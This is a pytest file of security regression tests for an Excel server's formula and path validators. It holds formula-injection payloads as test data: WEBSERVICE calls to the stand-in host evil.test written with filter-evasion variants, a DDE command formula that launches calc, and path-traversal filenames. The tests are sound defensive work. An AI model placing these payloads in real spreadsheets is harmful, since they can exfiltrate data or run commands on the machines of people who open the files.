"""Security-focused regression tests."""

import pytest

from excel_mcp_server.utils.security import FormulaValidator, PathValidator


@pytest.mark.parametrize(
    ("formula", "expected_error"),
    [
        ('=WEBSERVICE("http://evil.test")', "blocked function"),
        ('=@WEBSERVICE("http://evil.test")', "blocked function"),
        ('=SUM(1, _xlfn.WEBSERVICE("http://evil.test"))', "blocked function"),
        ('=WEBSERVICE  ("http://evil.test")', "blocked function"),
        ('=WEBSERVICE & CHAR(40)', "blocked function"),
        ('=WEBSERVICE&UNICHAR(40)', "blocked function"),
        ("=cmd|'/C calc'!A0", "blocked syntax"),
    ],
)
def test_formula_validator_blocks_unsafe_formula_shapes(formula, expected_error):
    """Unsafe formulas should be rejected even with prefixes or DDE syntax."""
    is_valid, error = FormulaValidator.validate_formula(formula)
    assert not is_valid
    assert expected_error in error


def test_formula_validator_ignores_blocked_names_inside_strings():
    """String literals mentioning blocked functions should remain valid."""
    is_valid, error = FormulaValidator.validate_formula('="WEBSERVICE("')
    assert is_valid
    assert error == ""


@pytest.mark.parametrize("path", ["../escape.xlsx", "..\\escape.xlsx"])
def test_path_validator_rejects_traversal_segments(path):
    """Relative parent traversal must be rejected."""
    is_valid, error = PathValidator.validate_path(path, check_allowed=False)
    assert not is_valid
    assert "traversal" in error.lower()
